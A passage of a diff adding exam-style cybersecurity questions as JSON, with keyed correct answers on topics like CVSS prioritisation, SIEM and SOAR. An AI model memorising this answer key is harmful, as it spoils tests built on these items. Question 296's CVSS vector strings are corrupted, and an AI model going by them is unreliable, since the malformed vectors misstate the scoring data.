+    "question_text": "Which of the following best describes the importance of KPIs in an incident response exercise?",
+    "image": null,
+    "options": {
+      "A": "To identify the personal performance of each analyst",
+      "B": "To describe how incidents were resolved",
+      "C": "To reveal what the team needs to prioritize  ",
+      "D": "To expose which tools should be used"
+    },
+    "correct_answer": "C"
+  },
+  {
+    "question_number": "293",
+    "question_text": "An organization is conducting a pilot deployment of an e-commerce application. The application's source code is not available. Which of the following strategies should an analyst recommend to evaluate the security of the software?",
+    "image": null,
+    "options": {
+      "A": "Static testing",
+      "B": "Vulnerability testing",
+      "C": "Dynamic testing  ",
+      "D": "Penetration testing"
+    },
+    "correct_answer": "C"
+  },
+  {
+    "question_number": "294",
+    "question_text": "A security team needs to demonstrate how prepared the team is in the event of a cyberattack. Which of the following would best demonstrate a real-world incident without impacting operations?",
+    "image": null,
+    "options": {
+      "A": "Review lessons-learned documentation and create a playbook.",
+      "B": "Gather all internal incident response party members and perform a simulation.  ",
+      "C": "Deploy known malware and document the remediation process.",
+      "D": "Schedule a system recovery to the DR site for a few applications."
+    },
+    "correct_answer": "B"
+  },
+  {
+    "question_number": "295",
+    "question_text": "A SOC receives several alerts indicating user accounts are connecting to the company's identity provider through non-secure communications. User credentials for accessing sensitive, business-critical systems could be exposed. Which of the following logs should the SOC use when determining malicious intent?",
+    "image": null,
+    "options": {
+      "A": "DNS",
+      "B": "tcpdump  ",
+      "C": "Directory",
+      "D": "IDS"
+    },
+    "correct_answer": "B"
+  },
+  {
+    "question_number": "296",
+    "question_text": "A vulnerability scan of a web server that is exposed to the internet was recently completed. A security analyst is reviewing the resulting vector strings:\n\nVulnerability 1: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L\n Vulnerability 2: CVSS:3.0/AV:L/AC:H/PR:N/UI:N/S:U/C:L/1:L/A:H\n Vulnerability 3: CVSS:3.C/AV:A/AC:H/PR:L/UI:R/S:U/C:L/T:H/A:L\n Vulnerability 4: CVSS:3.C/AV:P/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:L\n\nWhich of the following vulnerabilities should be patched first?",
+    "image": null,
+    "options": {
+      "A": "Vulnerability 1  ",
+      "B": "Vulnerability 2",
+      "C": "Vulnerability 3",
+      "D": "Vulnerability 4"
+    },
+    "correct_answer": "A"
+  },
+  {
+    "question_number": "297",
+    "question_text": "Each time a vulnerability assessment team shares the regular report with other teams, inconsistencies regarding versions and patches in the existing infrastructure are discovered. Which of the following is the best solution to decrease the inconsistencies?",
+    "image": null,
+    "options": {
+      "A": "Implementing credentialed scanning",
+      "B": "Changing from a passive to an active scanning approach",
+      "C": "Implementing a central place to manage IT assets  ",
+      "D": "Performing agentless scanning"
+    },
+    "correct_answer": "C"
+  },
+  {
+    "question_number": "298",
+    "question_text": "An organization plans to use an advanced machine-learning tool as a central collection server. The tool will perform data aggregation and analysis. Which of the following should the organization implement?",
+    "image": null,
+    "options": {
+      "A": "SIEM  ",
+      "B": "Firewalls",
+      "C": "Syslog server",
+      "D": "Flow analysis"
+    },
+    "correct_answer": "A"
+  },
+  {
+    "question_number": "299",
+    "question_text": "A vulnerability analyst is writing a report documenting the newest, most critical vulnerabilities identified in the past month. Which of the following public MITRE repositories would be best to review?",
+    "image": null,
+    "options": {
+      "A": "Cyber Threat Intelligence",
+      "B": "Common Vulnerabilities and Exposures  ",
+      "C": "Cyber Analytics Repository",
+      "D": "ATT&CK"
+    },
+    "correct_answer": "B"
+  },
+  {
+    "question_number": "300",
+    "question_text": "A corporation wants to implement an agent-based endpoint solution to help:\n\n• Flag various threats\n\n• Review vulnerability feeds\n\n• Aggregate data\n\n• Provide real-time metrics by using scripting languages\n\nWhich of the following tools should the corporation implement to reach this goal?",
+    "image": null,
+    "options": {
+      "A": "DLP",
+      "B": "Heuristics",
+      "C": "SOAR  ",
+      "D": "NAC"
+    },
+    "correct_answer": "C"
+  }
+]
